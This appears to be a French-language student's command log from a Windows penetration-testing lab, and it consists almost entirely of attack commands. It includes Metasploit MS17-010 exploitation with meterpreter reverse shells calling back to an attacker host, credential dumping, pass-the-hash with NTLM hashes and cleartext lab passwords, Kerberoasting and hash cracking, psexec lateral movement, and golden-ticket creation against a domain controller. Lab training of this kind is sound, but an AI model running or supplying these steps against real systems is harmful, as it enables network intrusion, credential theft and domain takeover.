# Commandes du laboratoire SOS Windows

## 3.1

### recon

```
db_nmap -Pn -n -F 172.22.4.0/29 --open
use auxiliary/scanner/smb/smb_version
services -p 445 -R
run
```

## 3.2

### trouver les vuln ms17

```
use auxiliary/scanner/smb/smb_ms17_010
services -p 445 -R
run
```

.6 et .7 sont vuln

### exploit de la vuln, reverse shell dans la .7

```
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 172.22.4.7
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 172.22.3.151
run
```

## 3.3

### récup des mdp

```
run post/windows/gather/hashdump
run post/windows/gather/cachedump
run post/windows/gather/lsa_secrets
run post/windows/gather/credentials/gpp
run post/windows/gather/credentials/domain_hashdump
```

### test si les mdp sont utilisés sur d'autres machines

```
s
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:e89aa5264c5da7e343276524d47d36b3
set SMBDomain .
services -p 445 -R
run
```

### test le compte svc_sched sur les machines

```
use auxiliary/scanner/smb/smb_login
set SMBUser svc_sched
set SMBPass K33pAlive4ever
set SMBDomain .
services -p 445 -R
run
```

## 3.4

### recherche des SPN sur la .6/.7

```
shell
setspn -T wad.local -Q */*
```

### get vuln SPN

```
use auxiliary/gather/get_user_spns
set RHOSTS 172.22.4.2
set user svc_sched
set pass K33pAlive4ever
set domain wad.local
run
```

### crack TGS
```
john --format=krb5tgs [hash_file]
```

### test adm-sql/Andromeda1 sur toutes les machines

```
use auxiliary/scanner/smb/smb_login
services -p 445 -R
set SMBUser adm-sql
set SMBPass Andromeda1
set SMBDomain wad.local
run
```

Admin account on .4

## 3.5

### connect to .4

```
use exploit/windows/smb/psexec
set RHOSTS 172.22.4.4
set SMBUSer adm-sql
set SMBPass Andromeda1
set SMBDomain wad
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 172.22.3.151
run
```

### get some pwd

```
load kiwi
creds_all
```

Get ntlm hash 2e71..4f3

### connect to another vuln machine (.5)

```
use exploit/windows/smb/psexec
set RHOSTS 172.22.4.5
set SMBUSer Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:2e71b731ab1d9633b426042fa274e4f3
set SMBDomain .
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 172.22.3.151
run
```

### get pwd for .2

```
load kiwi
creds_all
```

### connect to .2

```
use exploit/windows/smb/psexec
set RHOSTS 172.22.4.2
set SMBUSer Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:24932905c77797ff123f3cc94f3e2bdd
set SMBDomain WAD
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 172.22.3.151
run
```

## 3.6

### connect to sql srv

```
use exploit/windows/smb/psexec
set RHOSTS 172.22.4.4
set SMBUSer adm-sql
set SMBPass Andromeda1
set SMBDomain wad
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 172.22.3.151
run
```

### find pid of student15

```
shell
tasklist /v
exit
```

Process id was 4264.

### migrate into process

```
migrate 4264
getuid
```

### getsid

```
shell
whoami /all
exit
```

### clean up

```
load kiwi
kiwi_cmd kerberos::purge
```

### try mounting disk C of DC

```
shell
net use x: \\WAD-DC-SRV2\C$
exit
```

### generate and inject golden ticket

```
golden_ticket_create -d wad.local -u groupe_15 -s S-1-5-21-2457413560-2955850660-1781579164 -k 64fec6cf9ed3b1d61b90f002f7e27999 -t golden_ticket.kirbi
kerberos_ticket_use golden_ticket.kirbi
```

### retry mounting disk C

```
shell
net use x: \\WAD-DC-SRV2\C$
exit
```

### access logs

```
load powershell
powershell_shell
Get-EventLog -LogName Security -ComputerName WAD-DC-SRV2 -Newest 30 | Where-Object {$_.EventID -eq 4624} | Select-Object -Property TimeGenerated, EventID,@{Label="Username";Expression={$_.replacementstrings[5]}}
exit
```
